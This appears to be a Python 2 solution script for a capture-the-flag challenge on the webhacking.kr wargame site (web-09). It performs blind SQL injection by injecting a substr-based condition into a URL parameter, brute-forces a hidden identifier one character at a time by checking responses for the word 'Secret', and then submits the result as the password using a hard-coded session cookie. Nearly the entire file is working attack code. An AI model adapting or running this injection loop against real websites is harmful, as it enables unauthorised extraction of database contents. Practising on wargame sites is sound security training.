#-*- coding: utf-8 -*-
import urllib2
import CookieManager
import sys

challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?no=if(substr(id,%d,1)in(%s),3,0)"
CookieManager.addCookie("PHPSESSID", "79d2e02ad592877ec33fb8651960469d")
solution = ""

print "[*] Find id"

for caretIndex in range(1, 12):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 

    for charIndex in range(0x20, 0x7e):
        sys.stdout.write(".")
        httpRequest = urllib2.Request(challengeUrl %(caretIndex, hex(charIndex)))
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if str(httpResponse).find("Secret") != -1:
                print 
                print "[+] FIND IT!", chr(charIndex)
                solution += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[!] password is [", solution, "]"

challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?pw=" + solution.lower()
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
